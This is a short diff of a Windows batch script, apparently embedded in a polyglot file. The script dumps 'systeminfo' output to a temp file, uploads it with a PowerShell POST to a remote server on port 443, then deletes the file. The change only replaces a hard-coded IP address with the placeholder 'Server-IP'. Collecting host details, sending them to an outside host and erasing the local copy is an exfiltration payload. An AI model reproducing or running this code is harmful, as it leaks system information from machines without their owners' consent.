@@ -9,6 +9,6 @@ exit /b
 -->
 
 systeminfo > "%TEMP%\systeminfo.txt"
-powershell -command "& { Invoke-WebRequest -Uri 'http://172.17.53.110:443' -Method POST -InFile '%TEMP%\systeminfo.txt' }"
+powershell -command "& { Invoke-WebRequest -Uri 'http://Server-IP:443' -Method POST -InFile '%TEMP%\systeminfo.txt' }"
 del "%TEMP%\systeminfo.txt"
 pause
